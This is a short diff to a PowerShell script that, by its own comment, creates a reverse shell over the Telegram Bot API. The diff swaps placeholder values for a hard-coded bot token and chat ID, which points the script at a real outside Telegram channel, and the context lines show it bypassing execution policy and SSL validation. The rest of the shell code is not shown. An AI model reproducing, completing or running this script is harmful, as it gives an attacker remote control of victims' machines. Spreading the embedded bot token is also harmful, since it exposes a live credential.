@@ -2,9 +2,11 @@
 # This script creates a reverse shell through Telegram Bot API
 
 param(
-    [string]$BotToken = "YOUR_BOT_TOKEN_HERE",
-    [string]$ChatID = "YOUR_CHAT_ID_HERE"
+    [string]$BotToken = "8407278774:AAGEmM5uYtgYw1RrpPrc54zrHTFJ2ZbhtJs",
+    [string]$ChatID = "2047893044"
 )
+
+
 
 # Bypass execution policy and SSL validation
 Set-ExecutionPolicy Bypass -Scope Process -Force
